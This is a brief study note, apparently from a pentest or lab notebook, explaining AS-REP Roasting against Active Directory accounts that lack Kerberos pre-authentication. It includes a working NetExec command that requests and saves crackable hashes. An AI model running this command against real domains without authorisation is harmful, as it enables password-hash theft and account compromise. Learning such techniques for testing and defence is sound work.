## AS-REP Roasting:

> AS-REP Roasting is an Active Directory attack where you request encrypted password hashes for accounts that don’t require Kerberos pre-authentication, and then crack the hashes offline.

🧠 Key point:

- Some AD users have the **"Do not require Kerberos preauthentication"** flag set.
- These users are vulnerable to AS-REP Roasting.
```bash
nxc ldap 10.10.250.148 -u users.txt -p '' --asreproast output.txt 
```

- `-u users.txt`: A list of usernames to test.
- `-p '' ` : Blank password (we're not logging in).
- `--asreproast` : Enables AS-REP roasting.
- `output.txt`: File where captured hashes will be saved
